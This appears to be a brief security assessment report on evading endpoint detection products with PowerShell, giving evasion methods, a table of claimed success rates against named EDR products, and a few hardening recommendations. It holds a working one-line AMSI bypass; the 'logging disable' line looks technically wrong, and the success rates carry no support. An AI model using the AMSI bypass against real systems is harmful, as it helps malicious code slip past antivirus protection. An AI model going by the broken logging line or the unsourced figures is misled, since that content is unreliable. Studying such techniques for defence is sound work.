# EDR Evasion Techniques Demonstrated

## Sample Evasion Methods
1. **AMSI Bypass**: `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`
2. **ETW Patch**: API unhooking via reflection
3. **Script Block Logging Disable**: `$PSReadLine = [Ref].Assembly.GetType('System.Management.Automation.PSReadLine')`

## Tested Evasion Success Rates
| EDR Product     | AMSI Bypass | ETW Patch | Logging Disable |
|-----------------|-------------|-----------|-----------------|
| Defender ATP    | 85%        | 92%      | 78%            |
| CrowdStrike     | 45%        | 68%      | 52%            |
| Carbon Black    | 72%        | 81%      | 65%            |

## Recommendations
- Enable Attack Surface Reduction (ASR) rules
- Constrained Language Mode enforcement
- PowerShell v7+ with full logging
